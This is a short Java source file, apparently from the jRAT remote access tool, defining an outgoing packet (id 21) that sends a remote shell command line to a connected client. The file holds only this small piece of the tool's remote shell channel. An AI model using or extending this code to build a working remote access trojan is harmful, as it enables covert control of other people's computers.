package jrat.module.shell.packets;

import jrat.client.Connection;
import jrat.client.packets.outgoing.OutgoingPacket;


public class Packet21RemoteShell implements OutgoingPacket {

	private String line;

	public Packet21RemoteShell(String line) {
		this.line = line;
	}

	@Override
	public void write(Connection con) throws Exception {
		con.writeLine(this.line);
	}

	@Override
	public short getPacketId() {
		return 21;
	}

}
